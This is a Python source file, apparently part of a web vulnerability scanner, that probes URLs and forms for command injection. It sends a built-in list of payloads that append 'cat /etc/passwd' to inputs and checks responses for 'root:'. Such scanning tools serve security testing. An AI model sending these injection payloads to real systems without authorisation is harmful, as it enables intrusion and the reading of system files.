from Helper import *

class CommandInjection():
	"""docstring for CommandInjection"""
	def __init__(self,se,urls,forms):
		self.se = se
		self.cheatsheets = [';cat /etc/passwd', '|| cat /etc/passwd','8.8.8.8 && cat /etc/passwd', '&;& cat /etc/passwd', '|cat /etc/passwd', 'cat put /etc/passwd'] #self.readFromFile("scan/commandInjectionCheatSheet.txt")
		self.urls = urls
		self.vulnLinks = []
		self.forms = forms

	def readFromFile(self,filename):
		f = open(filename)
		lines = f.readlines()
		lst = map(lambda x: x[:-1], lines)
		f.close()
		return lst

	def checkRootInAns(self, ans):
		return not notFound(ans) and 'root:' in ans.text

	def checkComInjec(self, url_or_form, is_form=False):
		if not is_form:
			for cs in self.cheatsheets:
				res = url_or_form.send_padded_link(self.se, cs)
				if res:
					addr, ans = res
					if self.checkRootInAns(ans):
						return True
		else:
			for cs in self.cheatsheets:
				res = url_or_form.send_padded_form(self.se, cs)
				if res:
					addr, ans = res
					if self.checkRootInAns(ans):
						return True
		return False

	def getAllVulnLinks(self):
		for url in self.urls:
			link = Link(url)
			if self.checkComInjec(link):
				self.vulnLinks.append(url + " - Command Injection")
		return self.vulnLinks

		
	def getAllVulnForms(self):
		vulnForms = []
		for form in self.forms:
			res = self.checkComInjec(Form(form), is_form = True)
			print res
			if res:
				vulnForms.append((str(form) + str(res) + " - Command Injection"))
		return vulnForms